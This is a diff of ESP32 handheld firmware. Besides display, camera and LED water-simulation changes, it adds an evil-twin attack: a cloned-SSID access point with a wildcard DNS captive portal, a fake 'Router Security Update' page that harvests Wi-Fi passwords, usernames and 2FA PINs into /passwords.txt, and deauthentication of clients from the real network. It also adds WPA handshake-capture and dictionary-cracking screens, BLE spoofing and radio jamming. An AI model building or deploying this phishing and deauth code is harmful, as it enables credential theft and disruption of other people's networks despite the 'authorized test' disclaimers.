       tft.setTextColor(UI_WARN);
       tft.setTextSize(3);
       tft.setCursor(32, 76);
@@ -3530,7 +3963,8 @@ static void tftDrawBmpViewer() {
       return;
     }
   }
-  if (!tftDrawBmpFromFS(path, drawX, drawY)) {
+  if ((!looksBmp && !sp.endsWith(".bmp")) || !tftDrawBmpFromFS(path, drawX, drawY)) {
+    if (tftDrawJpgFromFS(path)) return;
     tft.setTextColor(UI_WARN);
     tft.setTextSize(3);
     tft.setCursor(32, 76);
@@ -3540,17 +3974,10 @@ static void tftDrawBmpViewer() {
 
 static bool tftDrawJpgFromFS(const char *path) {
   if (!LittleFS.exists(path)) return false;
-  File f = LittleFS.open(path, "r");
-  if (!f) return false;
-  size_t sz = f.size();
-  uint8_t *buf = (uint8_t *)malloc(sz);
-  if (!buf) { f.close(); return false; }
-  size_t got = f.read(buf, sz);
-  f.close();
-  if (got != sz) { free(buf); return false; }
-
   uint16_t jw = 0, jh = 0;
-  if (TJpgDec.getJpgSize(&jw, &jh, buf, (uint32_t)sz) != JDR_OK) { free(buf); return false; }
+  if (TJpgDec.getFsJpgSize(&jw, &jh, path, LittleFS) != JDR_OK) return false;
+  if (jw == 0 || jh == 0) return false;
+
   // choose largest power-of-two scale such that decoded size is >= display size if possible
   uint8_t scale = 1;
   while (scale < 8) {
@@ -3578,9 +4005,7 @@ static bool tftDrawJpgFromFS(const char *path) {
   cameraFrameY = (int16_t)((tft.height() - (int16_t)dh) / 2);
 
   // draw via TJpgDec which will invoke the existing JPEG callback (`cameraJpgDraw`) that handles scaling
-  TJpgDec.drawJpg(cameraFrameX, cameraFrameY, buf, (uint32_t)sz);
-  free(buf);
-  return true;
+  return TJpgDec.drawFsJpg(cameraFrameX, cameraFrameY, path, LittleFS) == JDR_OK;
 }
 
 static void tftDrawGifStartOrError() {
@@ -3613,7 +4038,7 @@ static void tftDrawCameraStatus(const String &line1, const String &line2) {
   }
   tft.setTextColor(UI_MUTED);
   tft.setCursor(12, 220);
-  tft.print("OK:capture  OK(hold):back");
+  tft.print("UP:mode DOWN/OK:rec-photo");
 }
 
 static void tftDrawGameMenu(bool force) {
@@ -4958,57 +5383,146 @@ static void gifLoopStep() {
 
 static void waterReset() {
   memset(water, 0, sizeof(water));
-  for (int i = 0; i < 18; i++) water[random(0, 8)][random(0, 8)] = random(120, 255);
+  // Start with a central puddle, then let it spread across the full 8x8 area.
+  for (int y = 2; y <= 5; y++) {
+    for (int x = 2; x <= 5; x++) {
+      water[y][x] = (uint16_t)random(120, 170);
+    }
+  }
 }
 
 static void waterStep() {
   uint32_t now = millis();
   if (now - lastWaterStepMs < 40) return;
   lastWaterStepMs = now;
+
   float rollDeg, pitchDeg;
   computeTiltDeg(rollDeg, pitchDeg);
-  int sx = (rollDeg > 12.0f) ? 1 : (rollDeg < -12.0f ? -1 : 0);
-  int sy = (pitchDeg > 12.0f) ? -1 : (pitchDeg < -12.0f ? 1 : 0);
+
+  const float bx = constrain(rollDeg / 35.0f, -1.0f, 1.0f);
+  // Vertical control correction: UP/DOWN follows physical tilt direction.
+  const float by = -constrain(pitchDeg / 35.0f, -1.0f, 1.0f);
+  const uint16_t WATER_CELL_MAX = 190;
+  const int XMIN = 0, XMAX = 7, YMIN = 0, YMAX = 7;
+
+  uint32_t totalBefore = 0;
+  for (int y = YMIN; y <= YMAX; y++) {
+    for (int x = XMIN; x <= XMAX; x++) {
+      totalBefore += water[y][x];
+    }
+  }
+
   memset(waterTmp, 0, sizeof(waterTmp));
-  for (int y = 0; y < 8; y++) {
-    for (int x = 0; x < 8; x++) {
-      uint8_t v = water[y][x];
-      if (v == 0) continue;
-      int vv = v - 2;
-      if (vv < 0) vv = 0;
-      int nx = constrain(x + sx, 0, 7);
-      int ny = constrain(y + sy, 0, 7);
-      int moved = (vv * 70) / 100;
-      int stay = vv - moved;
-      int spread = (vv * 10) / 100;
-      int cur = waterTmp[ny][nx] + moved;
-      waterTmp[ny][nx] = (cur > 255) ? 255 : cur;
-      cur = waterTmp[y][x] + stay;
-      waterTmp[y][x] = (cur > 255) ? 255 : cur;
-      if (spread > 0) {
-        int each = spread / 4;
-        if (each < 1) each = 1;
-        static const int dirs[4][2] = {{1,0},{-1,0},{0,1},{0,-1}};
-        for (int k = 0; k < 4; k++) {
-          int xx = x + dirs[k][0];
-          int yy = y + dirs[k][1];
-          if (xx < 0 || xx > 7 || yy < 0 || yy > 7) continue;
-          int cc = waterTmp[yy][xx] + each;
-          waterTmp[yy][xx] = (cc > 255) ? 255 : cc;
-        }
+
+  // Advection with tilt-biased directional weights, constrained to interior box.
+  for (int y = YMIN; y <= YMAX; y++) {
+    for (int x = XMIN; x <= XMAX; x++) {
+      uint16_t a = water[y][x];
+      if (a == 0) continue;
+
+      int wL = 16 + (bx < 0.0f ? (int)(-bx * 24.0f) : 0);
+      int wR = 16 + (bx > 0.0f ? (int)( bx * 24.0f) : 0);
+      int wU = 16 + (by < 0.0f ? (int)(-by * 24.0f) : 0);
+      int wD = 16 + (by > 0.0f ? (int)( by * 24.0f) : 0);
+      int wC = 36;
+      int wSum = wL + wR + wU + wD + wC;
+
+      uint16_t keep = (uint16_t)(((uint32_t)a * (uint32_t)wC) / (uint32_t)wSum);
+      waterTmp[y][x] += keep;
+      uint16_t rem = a - keep;
+
+      uint16_t fL = (uint16_t)(((uint32_t)rem * (uint32_t)wL) / (uint32_t)(wL + wR + wU + wD));
+      uint16_t fR = (uint16_t)(((uint32_t)rem * (uint32_t)wR) / (uint32_t)(wL + wR + wU + wD));
+      uint16_t fU = (uint16_t)(((uint32_t)rem * (uint32_t)wU) / (uint32_t)(wL + wR + wU + wD));
+      uint16_t fD = (uint16_t)(rem - fL - fR - fU);
+
+      if (x > XMIN) waterTmp[y][x - 1] += fL; else waterTmp[y][x] += fL;
+      if (x < XMAX) waterTmp[y][x + 1] += fR; else waterTmp[y][x] += fR;
+      if (y > YMIN) waterTmp[y - 1][x] += fU; else waterTmp[y][x] += fU;
+      if (y < YMAX) waterTmp[y + 1][x] += fD; else waterTmp[y][x] += fD;
+    }
+  }
+
+  // Capacity pass: prevents unrealistic pile-up in corners and keeps motion box-like.
+  for (uint8_t pass = 0; pass < 2; pass++) {
+    uint16_t spill[8][8];
+    memset(spill, 0, sizeof(spill));
+    for (int y = YMIN; y <= YMAX; y++) {
+      for (int x = XMIN; x <= XMAX; x++) {
+        uint16_t v = waterTmp[y][x];
+        if (v <= WATER_CELL_MAX) continue;
+        uint16_t excess = (uint16_t)(v - WATER_CELL_MAX);
+        waterTmp[y][x] = WATER_CELL_MAX;
+
+        uint8_t n = 0;
+        if (x > XMIN) n++;
+        if (x < XMAX) n++;
+        if (y > YMIN) n++;
+        if (y < YMAX) n++;
+        if (n == 0) continue;
+
+        uint16_t each = excess / n;
+        uint16_t rem = excess % n;
+        if (x > XMIN) { spill[y][x - 1] += each; if (rem) { spill[y][x - 1]++; rem--; } }
+        if (x < XMAX) { spill[y][x + 1] += each; if (rem) { spill[y][x + 1]++; rem--; } }
+        if (y > YMIN) { spill[y - 1][x] += each; if (rem) { spill[y - 1][x]++; rem--; } }
+        if (y < YMAX) { spill[y + 1][x] += each; if (rem) { spill[y + 1][x]++; rem--; } }
+      }
+    }
+    for (int y = YMIN; y <= YMAX; y++) {
+      for (int x = XMIN; x <= XMAX; x++) {
+        waterTmp[y][x] += spill[y][x];
       }
     }
   }
-  if (random(0, 10) == 0) {
-    int rx = random(0, 8), ry = random(0, 8);
-    int nv = waterTmp[ry][rx] + random(80, 160);
-    waterTmp[ry][rx] = (nv > 255) ? 255 : nv;
+
+  // Gentle smoothing keeps it fluid-like rather than blocky.
+  for (int y = YMIN; y <= YMAX; y++) {
+    for (int x = XMIN; x <= XMAX; x++) {
+      uint32_t sum = waterTmp[y][x] * 5;
+      uint8_t cnt = 5;
+      if (x > XMIN) { sum += waterTmp[y][x - 1]; cnt++; }
+      if (x < XMAX) { sum += waterTmp[y][x + 1]; cnt++; }
+      if (y > YMIN) { sum += waterTmp[y - 1][x]; cnt++; }
+      if (y < YMAX) { sum += waterTmp[y + 1][x]; cnt++; }
+      water[y][x] = (uint16_t)(sum / cnt);
+    }
   }
-  memcpy(water, waterTmp, sizeof(water));
+
+  // Mass correction to avoid gradual disappearance from integer rounding.
+  uint32_t totalAfter = 0;
+  for (int y = YMIN; y <= YMAX; y++) {
+    for (int x = XMIN; x <= XMAX; x++) totalAfter += water[y][x];
+  }
+  if (totalAfter < totalBefore) {
+    uint32_t deficit = totalBefore - totalAfter;
+    while (deficit > 0) {
+      int rx = random(XMIN, XMAX + 1);
+      int ry = random(YMIN, YMAX + 1);
+      uint16_t room = (uint16_t)(WATER_CELL_MAX > water[ry][rx] ? (WATER_CELL_MAX - water[ry][rx]) : 0);
+      if (room == 0) continue;
+      uint16_t add = (uint16_t)min<uint32_t>(room, deficit);
+      water[ry][rx] += add;
+      deficit -= add;
+    }
+  } else if (totalAfter > totalBefore) {
+    uint32_t excess = totalAfter - totalBefore;
+    while (excess > 0) {
+      int rx = random(XMIN, XMAX + 1);
+      int ry = random(YMIN, YMAX + 1);
+      if (water[ry][rx] == 0) continue;
+      uint16_t sub = (uint16_t)min<uint32_t>(water[ry][rx], excess);
+      water[ry][rx] -= sub;
+      excess -= sub;
+    }
+  }
+
   for (int y = 0; y < 8; y++) {
     for (int x = 0; x < 8; x++) {
-      uint8_t a = water[y][x];
-      leds[y * 8 + x] = CRGB(0, (uint8_t)(a / 5), a);
+      uint8_t a = (uint8_t)constrain((int)water[y][x], 0, 255);
+      uint8_t blue = (uint8_t)map(a, 0, WATER_CELL_MAX, 0, 255);
+      uint8_t green = (uint8_t)map(a, 0, WATER_CELL_MAX, 0, 96);
+      leds[y * 8 + x] = CRGB(0, green, blue);
     }
   }
   applyBrightnessIfDirty();
@@ -5053,15 +5567,51 @@ static void enterMode(AppMode mode) {
       tft.setRotation(prevTftRotation);
       cameraRotationSaved = false;
     }
+    if (webServerRunning && cameraIsUartMode() && cameraUartEnsureInit()) {
+      if (xiaoWebServerEnabled) {
+        cameraUartSyncXiaoNetworkConfig();
+      }
+      (void)cameraUartSendWebServerState(xiaoWebServerEnabled);
+    }
+    if (mode == APP_AUDIO_RECORD && cameraIsUartMode() && cameraUartEnsureInit()) {
+      (void)cameraUartSendTimeNow();
+      cameraAudioRecStateText = cameraAudioRecActive ? (cameraAudioRecPaused ? "Paused" : "Recording") : "Ready";
+      cameraLastError = "Audio controller ready";
+    }
   } else {
+    stopDeauthIfActive();
+    if (bleSpoofingActive && pBleAdvertising) {
+      pBleAdvertising->stop();
+      bleSpoofingActive = false;
+    }
+#if HAS_RF24_LIB
+    if (nrfJammingActive) {
+      nrfJammingActive = false;
+      if (nrfRadioFound) {
+        nrfRadio.stopConstCarrier();
+        nrfRadio.powerDown();
+        nrfRadio.powerUp();
+      }
+    }
+#endif
+    songStop();
+    gifStop();
+
     // entering camera mode: clear backoff so connect is attempted immediately
     cameraReconnectBackoffUntilMs = 0;
     cameraFailCount = 0;
     cameraLastConnectMs = 0;
-    // rotate display to orientation 3 while in camera mode
+    // rotate display specifically for camera view
     prevTftRotation = tft.getRotation();
-    tft.setRotation(3);
+    tft.setRotation(CAMERA_TFT_ROTATION);
     cameraRotationSaved = true;
+    if (cameraIsUartMode() && cameraUartEnsureInit()) {
+      (void)cameraUartSendWebServerState(false);
+      xiaoWebServerEnabled = false;
+      (void)cameraUartSendControlState();
+      cameraRequestSdList();
+      cameraCtlOverlayUntilMs = millis() + 1500;
+    }
   }
 }
 
@@ -5087,10 +5637,10 @@ static void wifiScanAndShowList() {
   if (found > 0) {
     uint8_t limit = min<uint8_t>((uint8_t)found, WIFI_SCAN_MAX);
     for (uint8_t i = 0; i < limit; i++) {
-      wifiScanSsids[i] = WiFi.SSID(i);
-      wifiScanRssi[i] = WiFi.RSSI(i);
-      wifiScanOpen[i] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
-      wifiScanCount++;
+        wifiScanSsids[i] = WiFi.SSID(i);
+        wifiScanRssi[i] = WiFi.RSSI(i);
+        wifiScanOpen[i] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
+        wifiScanCount++;
     }
   }
   WiFi.scanDelete();
@@ -5100,34 +5650,36 @@ static void wifiScanAndShowList() {
 }
 
 void startDeauthScan() {
-  doNetworkInit();
-    wifiStatusMessage = "Scanning Targets...";
-    wifiLastConnectOk = false;
-    uiEnter(UI_DEAUTH_SCANNER);
-    WiFi.mode(WIFI_STA);
-    int found = WiFi.scanNetworks();
-    wifiScanCount = 0;
-    if (found > 0) {
-      uint8_t limit = min<uint8_t>((uint8_t)found, WIFI_SCAN_MAX);
-      for (uint8_t i = 0; i < limit; i++) {
-        wifiScanSsids[i] = WiFi.SSID(i);
-        wifiScanRssi[i] = WiFi.RSSI(i);
-        deauthScanChannels[i] = WiFi.channel(i);
-        const uint8_t *bssid = WiFi.BSSID(i);
-        if (bssid) memcpy(deauthScanBssids[i], bssid, 6);
-        else memset(deauthScanBssids[i], 0, 6);
-        wifiScanCount++;
-      }
-      wifiStatusMessage = "Select target";
-    } else {
-      wifiStatusMessage = (found == 0) ? String("No target found") : String("Scan failed");
-    }
-    WiFi.scanDelete();
-    wifiListIndex = 0;
-    uiMarkDirty();
+  wifiStatusMessage = "Scan Target via XIAO...";
+  wifiLastConnectOk = false;
+  uiEnter(UI_DEAUTH_SCANNER);
+  
+  wifiScanCount = 0;
+  wifiListIndex = 0;
+
+  // Trigger XIAO
+  uint8_t dummy = 1;
+  cameraUartSendPacket(CAM_PKT_WIFI_SCAN_CMD, &dummy, 1);
+  
+  uiMarkDirty();
 }
 
 
+
+void startWifiCrackerScan() {
+  wifiStatusMessage = "Scan Target via XIAO...";
+  wifiLastConnectOk = false;
+  uiEnter(UI_WIFI_CRACKER_SCAN);
+  
+  wifiScanCount = 0;
+  wifiListIndex = 0;
+
+  // Reuse the same command to get APs for cracking
+  uint8_t dummy = 1;
+  cameraUartSendPacket(CAM_PKT_WIFI_SCAN_CMD, &dummy, 1);
+  
+  uiMarkDirty();
+}
 
 static void tftDrawDeauthScanner() {
   tftDrawHeader("WiFi Killer");
@@ -5157,20 +5709,374 @@ static void tftDrawDeauthScanner() {
       tft.print(wifiScanSsids[i]);
       tft.setTextSize(1);
       tft.setCursor(24, y + 22);
-      tft.print(String("CH ") + deauthScanChannels[i]);
-      tft.setCursor(78, y + 22);
-      tft.print(String(wifiScanRssi[i]) + " dBm");
+      tft.print(getEncryptionTypeStr(wifiScanAuth[i]));
+      tft.setCursor(80, y + 22);
+      tft.print("CH:" + String(deauthScanChannels[i]));
+      tft.setCursor(120, y + 22);
+      tft.print(String(wifiScanRssi[i]) + "dBm");
     }
   }
   if (wifiStatusMessage.length() > 0) {
-    tft.fillRect(12, 228, 216, 10, UI_BG);
+    tft.fillRect(12, 228, 216, 20, UI_BG);
     tft.setTextSize(1);
-    tft.setTextColor(wifiLastConnectOk ? UI_OK : UI_WARN);
-    tft.setCursor(12, 230);
+    tft.setTextColor(UI_WARN);
+    tft.setCursor(12, 228);
+    tft.print("Attacks only work on 2.4GHz WiFi!");
+    tft.setCursor(12, 238);
+    tft.print("Disclaim: For authorized test only");
+  }
+  tftDrawListScrollbar(226, 60, 140, itemCount, visibleCount, firstVisible);
+}
+
+static void startEvilTwinScan() {
+  uint8_t dummy = 1;
+  cameraUartSendPacket(CAM_PKT_WIFI_SCAN_CMD, &dummy, 1);
+  wifiScanCount = 0;
+  wifiListIndex = 0;
+  uiEnter(UI_EVIL_TWIN_SCAN);
+  wifiStatusMessage = "Scanning Target...";
+  uiMarkDirty();
+}
+
+static void startMatrixCaptivePortal() {
+  if (webServerRunning) webServerStop(); // Stop UI web server
+  
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(evilTwinTargetSsid.c_str());
+  delay(100);
+
+  if (evilDnsServer == nullptr) evilDnsServer = new DNSServer();
+  if (evilTwinServer == nullptr) evilTwinServer = new WebServer(80);
+
+  evilDnsServer->start(53, "*", WiFi.softAPIP());
+
+  evilTwinServer->on("/", HTTP_GET, [](){
+    if (LittleFS.exists("/phish.html") && LittleFS.open("/phish.html", "r").size() > 0) {
+      File f = LittleFS.open("/phish.html", "r");
+      evilTwinServer->streamFile(f, "text/html");
+      f.close();
+    } else {
+      String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
+      html += "<title>Router Firmware Update</title><style>body{font-family:sans-serif;text-align:center;margin-top:50px;}";
+      html += "input{padding:10px;margin:10px;width:80%%;} button{padding:10px 20px;background:#007BFF;color:white;border:none;}</style>";
+      html += "</head><body><h2>Router Security Update</h2><p>Please enter your credentials to continue</p>";
+      html += "<form action='/login' method='POST'>";
+      html += "<input type='text' name='username' placeholder='Admin Username (Optional)'>";
+      html += "<input type='password' name='password' placeholder='Wi-Fi Password'>";
+      html += "<input type='text' name='code' placeholder='2FA / Security PIN (Optional)'>";
+      html += "<button type='submit'>Upgrade Firmware</button></form></body></html>";
+      evilTwinServer->send(200, "text/html", html);
+    }
+  });
+
+  evilTwinServer->on("/login", HTTP_POST, []() {
+    String pwd = evilTwinServer->arg("password");
+    String user = evilTwinServer->arg("username");
+    String code = evilTwinServer->arg("code");
+    
+    String entry = "";
+    if (user.length() > 0) entry += user + ":";
+    if (pwd.length() > 0) entry += pwd;
+    if (code.length() > 0) entry += " [" + code + "]";
+    
+    if (entry.length() > 0) {
+      pwd = entry; // Use 'pwd' var for UI drawing so it holds the whole string
+      if (evilTwinCapturedCount < MAX_EVIL_TWIN_PASSWORDS) {
+        evilTwinCapturedPwds[evilTwinCapturedCount++] = pwd;
+      } else {
+        for (int i = 0; i < MAX_EVIL_TWIN_PASSWORDS - 1; i++) {
+          evilTwinCapturedPwds[i] = evilTwinCapturedPwds[i+1];
+        }
+        evilTwinCapturedPwds[MAX_EVIL_TWIN_PASSWORDS - 1] = pwd;
+      }
+      
+      // Save permanently to Matrix internal storage
+      File f = LittleFS.open("/passwords.txt", "a");
+      if (f) {
+        f.println("SSID: " + evilTwinTargetSsid + " | CRED: " + pwd);
+        f.close();
+      }
+    }
+    evilTwinServer->send(200, "text/html", "<h2>Update Started...</h2><p>Your router is rebooting.</p>");
+    uiMarkDirty();
+  });
+
+  evilTwinServer->onNotFound([](){
+    evilTwinServer->sendHeader("Location", String("http://") + evilTwinDomain + "/", true);
+    evilTwinServer->send(302, "text/plain", "");
+  });
+
+  evilTwinServer->begin();
+  evilTwinStatusMsg = "AP Started: " + evilTwinTargetSsid;
+
+  // Send start deauth command to XIAO now that AP is ready
+  uint8_t payload[10] = {0};
+  memcpy(payload, deauthScanBssids[wifiListIndex], 6);
+  payload[6] = deauthScanChannels[wifiListIndex];
+  payload[7] = 1; // Reason code 1 (unspecified)
+  payload[8] = 0;
+  payload[9] = 1; // 1 = started
+  cameraUartSendPacket(CAM_PKT_DEAUTH_ATK_CMD, payload, 10);
+}
+
+static void stopMatrixCaptivePortal() {
+  if (evilDnsServer != nullptr) evilDnsServer->stop();
+  if (evilTwinServer != nullptr) evilTwinServer->stop();
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_STA);
+
+  evilTwinActive = false;
+  evilTwinState = EVIL_TWIN_OFF;
+
+  // Cleanup: Delete the payload logic to free up 2MB SPIFFS space
+  if (LittleFS.exists("/phish.html")) {
+    LittleFS.remove("/phish.html");
+  }
+  
+  // Send stop deauth command
+  uint8_t payload[10] = {0};
+  cameraUartSendPacket(CAM_PKT_DEAUTH_ATK_CMD, payload, 10);
+}
+
+
+static void tftDrawEvilTwinScan() {
+  tftDrawHeader("EvilTwin Scanner");
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(10, 40);
+  tft.print("U/D:pilih OK:buka OK+:back");
+  const uint8_t rescanIndex = wifiScanCount;
+  const uint8_t itemCount = wifiScanCount + 1;
+  const uint8_t visibleCount = 4;
+  uint8_t firstVisible = tftListFirstVisible(wifiListIndex, itemCount, visibleCount);
+  for (uint8_t row = 0; row < visibleCount; row++) {
+    uint8_t i = firstVisible + row;
+    if (i >= itemCount) break;
+    int y = 58 + row * 42;
+    bool selected = (i == wifiListIndex);
+    tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
+    tft.drawRoundRect(12, y, 216, 34, 10, selected ? UI_ACCENT : UI_LINE);
+    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
+    if (i == rescanIndex) {
+      tft.setTextSize(2);
+      tft.setCursor(24, y + 8);
+      tft.print("Rescan Target");
+    } else {
+      tft.setTextSize(2);
+      tft.setCursor(24, y + 6);
+      tft.print(wifiScanSsids[i]);
+      tft.setTextSize(1);
+      tft.setCursor(24, y + 22);
+      tft.print(getEncryptionTypeStr(wifiScanAuth[i]));
+      tft.setCursor(80, y + 22);
+      tft.print("CH:" + String(deauthScanChannels[i]));
+      tft.setCursor(120, y + 22);
+      tft.print(String(wifiScanRssi[i]) + "dBm");
+    }
+  }
+  if (wifiStatusMessage.length() > 0) {
+    tft.fillRect(12, 228, 216, 20, UI_BG);
+    tft.setTextSize(1);
+    tft.setTextColor(UI_WARN);
+    tft.setCursor(12, 228);
     tft.print(wifiStatusMessage);
   }
   tftDrawListScrollbar(226, 60, 140, itemCount, visibleCount, firstVisible);
+}
 
+static void tftDrawEvilTwinRun() {
+  tftDrawHeader("Evil Twin Active");
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(10, 40);
+  tft.print("OK(+): Stop & Back");
+
+  tft.setTextSize(2);
+  tft.setTextColor(UI_TEXT);
+  tft.setCursor(12, 70);
+  tft.print("Cloning Target:");
+  tft.setCursor(12, 95);
+  tft.setTextColor(UI_ACCENT);
+  tft.print(evilTwinTargetSsid);
+  
+  tft.setTextSize(1);
+  tft.setCursor(12, 130);
+  if (evilTwinState == EVIL_TWIN_PULLING) {
+    tft.setTextColor(UI_WARN);
+    tft.print(evilTwinStatusMsg);
+  } else if (evilTwinState == EVIL_TWIN_RUNNING) {
+    tft.setTextColor(UI_MUTED);
+    tft.print("Waiting for victim...");
+  } else {
+    tft.setTextColor(UI_MUTED);
+    tft.print("Starting...");
+  }
+  
+  if (evilTwinCapturedCount > 0) {
+    tft.fillRoundRect(10, 150, 220, 85, 10, UI_CARD_SEL);
+    tft.drawRoundRect(10, 150, 220, 85, 10, UI_ACCENT);
+    tft.setTextSize(1);
+    tft.setTextColor(UI_TEXT);
+    tft.setCursor(20, 160);
+    tft.print("CAPTURED: ");
+    tft.print(evilTwinCapturedCount);
+    tft.print(" (Saved in FS!)");
+    tft.setTextSize(2);
+    tft.setTextColor(UI_WARN);
+    
+    // Draw the latest 3 passwords
+    for (int i = 0; i < evilTwinCapturedCount && i < 3; i++) {
+      int idx = evilTwinCapturedCount - 1 - i; // Newest first
+      tft.setCursor(20, 175 + (i * 20));
+      tft.print(evilTwinCapturedPwds[idx]);
+    }
+  }
+}
+
+static void tftDrawWifiCrackerScanner() {
+  tftDrawHeader("WiFi Cracker");
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(10, 40);
+  tft.print("U/D:pilih OK:buka OK+:back");
+  const uint8_t rescanIndex = wifiScanCount;
+  const uint8_t itemCount = wifiScanCount + 1;
+  const uint8_t visibleCount = 4;
+  uint8_t firstVisible = tftListFirstVisible(wifiListIndex, itemCount, visibleCount);
+  for (uint8_t row = 0; row < visibleCount; row++) {
+    uint8_t i = firstVisible + row;
+    if (i >= itemCount) break;
+    int y = 58 + row * 42;
+    bool selected = (i == wifiListIndex);
+    tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
+    tft.drawRoundRect(12, y, 216, 34, 10, selected ? UI_ACCENT : UI_LINE);
+    tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
+    if (i == rescanIndex) {
+      tft.setTextSize(2);
+      tft.setCursor(24, y + 8);
+      tft.print("Rescan Target");
+    } else {
+      tft.setTextSize(2);
+      tft.setCursor(24, y + 6);
+      tft.print(wifiScanSsids[i]);
+      tft.setTextSize(1);
+      tft.setCursor(24, y + 22);
+      tft.print(getEncryptionTypeStr(wifiScanAuth[i]));
+      tft.setCursor(80, y + 22);
+      tft.print("CH:" + String(deauthScanChannels[i]));
+      tft.setCursor(120, y + 22);
+      tft.print(String(wifiScanRssi[i]) + "dBm");
+    }
+  }
+  tft.fillRect(12, 228, 216, 20, UI_BG);
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(12, 228);
+  tft.print("WPA Handshake Capturer!");
+  tft.setCursor(12, 238);
+  tft.print("Disclaim: For authorized test!");
+  tftDrawListScrollbar(226, 60, 140, itemCount, visibleCount, firstVisible);
+}
+
+static void tftDrawWifiCrackerDict() {
+  tftDrawHeader("Cracker Dict");
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(10, 40);
+  tft.print("U/D:nav UP+:pcap OK:pilih");
+
+  tft.setTextColor(crackerSavePcap ? UI_ACCENT : UI_MUTED);
+  tft.setCursor(170, 40);
+  tft.print(crackerSavePcap ? "PCAP: ON " : "PCAP: OFF");
+
+  tft.setTextColor(UI_TEXT);
+  tft.setCursor(10, 80);
+  tft.print("Select dict file from Xiao SD:");
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(10, 92);
+  tft.print("Found: " + String(crackerDictCount));
+  if (!crackerDictReqDone) {
+    tft.setTextColor(UI_ACCENT);
+    tft.setCursor(92, 92);
+    tft.print("(loading...)");
+  }
+
+  const int yOffset = 110;
+  if (crackerDictCount == 0) {
+    tft.setTextColor(UI_WARN);
+    tft.setCursor(10, yOffset);
+    tft.print("No .txt dictionaries found!");
+    tft.setCursor(10, yOffset + 20);
+    tft.print("Please copy to Xiao SD.");
+    return;
+  }
+
+  const uint8_t visibleCount = 4;
+  uint8_t firstVisible = tftListFirstVisible(crackerDictIndex, crackerDictCount, visibleCount);
+  for (uint8_t row = 0; row < visibleCount; row++) {
+    uint8_t i = firstVisible + row;
+    if (i >= crackerDictCount) break;
+    int y = yOffset + row * 22;
+    bool selected = (i == crackerDictIndex);
+    tft.setTextColor(selected ? UI_ACCENT : UI_MUTED);
+    tft.setCursor(10, y);
+    tft.print(selected ? "> " : "  ");
+    tft.setCursor(24, y);
+    tft.print(crackerDictFiles[i]);
+  }
+  tftDrawListScrollbar(226, 110, 88, crackerDictCount, visibleCount, firstVisible);
+}
+
+static void tftDrawWifiCrackerRun() {
+  tftDrawHeader("WPA Cracker");
+  tft.setTextSize(1);
+  tft.setTextColor(UI_MUTED);
+  tft.setCursor(10, 40);
+  tft.print("OK:start crack OK+:stop");
+
+  tft.setTextColor(UI_TEXT);
+  tft.setCursor(10, 70);
+  tft.print("Target: " + deauthTargetSsid);
+  tft.setCursor(10, 90);
+  tft.print("Dict: " + String(crackerSelectedDict));
+
+  tft.setTextSize(2);
+  tft.setCursor(10, 130);
+  if (!crackerHandshakeFound) {
+    tft.setTextColor(UI_WARN);
+    tft.print("1. Capturing...");
+    tft.setTextSize(1);
+    tft.setTextColor(UI_MUTED);
+    String stage = crackerCaptureStage;
+    if (stage.length() == 0) stage = "WAIT";
+    if (stage.length() > 24) stage = stage.substring(0, 24);
+    String metrics = crackerCaptureMetrics;
+    if (metrics.length() > 34) metrics = metrics.substring(0, 34);
+    tft.setCursor(10, 160);
+    tft.print("State: " + stage);
+    tft.setCursor(10, 176);
+    tft.print(metrics);
+    tft.setCursor(10, 194);
+    tft.print("Keep target connected");
+    return;
+  }
+
+  tft.setTextColor(UI_ACCENT);
+  tft.print("1. Handshake OK");
+  tft.setCursor(10, 160);
+  if (crackerDone) {
+    if (crackerPassword.length() > 0) {
+      tft.setTextColor(UI_OK);
+      tft.print("PWD: " + crackerPassword);
+    } else {
+      tft.setTextColor(UI_WARN);
+      tft.print("2. Exhausted.");
+    }
+  } else {
+    tft.setTextColor(UI_TEXT);
+    if (crackerHashTested == 0) tft.print("2. Press OK to start");
+    else tft.print("2. Tested: " + String(crackerHashTested));
+  }
 }
 
 static void tftDrawReasonPicker() {
@@ -5182,26 +6088,20 @@ static void tftDrawReasonPicker() {
 
   const uint8_t visibleCount = 4;
   uint8_t firstVisible = tftListFirstVisible(reasonListIndex, deauthReasonCount, visibleCount);
-
   for (uint8_t row = 0; row < visibleCount; row++) {
     uint8_t i = firstVisible + row;
     if (i >= deauthReasonCount) break;
     int y = 58 + row * 42;
     bool selected = (i == reasonListIndex);
-    
     tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
     tft.drawRoundRect(12, y, 216, 34, 10, selected ? UI_ACCENT : UI_LINE);
     tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
-    
     tft.setTextSize(1);
     tft.setCursor(22, y + 6);
     tft.print(deauthReasonList[i].title);
-    
-
   }
-  
-  tftDrawListScrollbar(226, 60, 140, deauthReasonCount, visibleCount, firstVisible);
 
+  tftDrawListScrollbar(226, 60, 140, deauthReasonCount, visibleCount, firstVisible);
   tft.fillRect(12, 228, 216, 10, UI_BG);
   tft.setTextSize(1);
   tft.setTextColor(UI_ACCENT);
@@ -5243,7 +6143,6 @@ static void tftDrawDeauthAttack() {
 }
 
 static bool wifiConnectSelectedNetwork() {
-  doNetworkInit();
   wifiStatusMessage = "Connecting...";
   wifiLastConnectOk = false;
   uiMarkDirty();
@@ -5312,10 +6211,9 @@ class KaniBleCallbacks : public BLEAdvertisedDeviceCallbacks {
 static void stopDeauthIfActive() {
   if (!deauthKilling) return;
   deauthKilling = false;
-  esp_wifi_set_promiscuous_rx_cb(NULL);
